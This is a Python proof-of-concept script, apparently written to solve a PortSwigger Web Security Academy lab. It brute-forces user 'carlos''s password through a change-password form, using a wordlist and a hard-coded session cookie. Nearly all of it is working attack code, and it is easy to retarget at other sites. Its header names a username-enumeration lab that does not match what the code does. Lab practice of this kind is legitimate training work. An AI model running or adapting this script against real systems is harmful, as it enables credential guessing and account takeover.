# Semi-autonomous proof-of-concept script for Portswigger Lab: 
# "Username enumeration via subtly different responses"
# Only cookies and url must be entered in main() to work 
# (and this could be easily automated as well)

import requests
import sys
import tqdm

ERROR_CODE = 1


def read_into_list(file):
    list = []

    with open(file) as file_object:
        contents = file_object.readlines()
        for line in contents:
            list.append(line.strip())

    return list


def bruteforce_password(url, cookies, user, passwords):
    for password in passwords:
        data = {
            "username": user,
            "current-password": password,
            "new-password-1": password,
            "new-password-2": password,
        }

        try:
            response = requests.post(url, cookies=cookies, data=data)
        except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

        if response.status_code != 200:
            print(response.status_code)

        if "Password changed successfully!" in response.text:
            print(
                f"[INFO ] Enumerated password '{password}' for user '{user}'!"
            )  
            return password
        

def main():
    url = "" \
    "https://0ab4006c037013bb81618e8600de00e4.web-security-academy.net/my-account/change-password" \
    ""
    cookies = {
        "session": "90xABDuxvaoXbJKwCm2vh7QWG7Ujw7VY",
    }
    user = "carlos"
    passwords_file = "passwords.txt"
    passwords = read_into_list(passwords_file)

    print(
        f"[DEBUG] Attempting password bruteforce attack on user '{user}'"
    )
    password = bruteforce_password(
        url, cookies=cookies, user=user, passwords=passwords
    )

    print()


if __name__ == "__main__":
    main()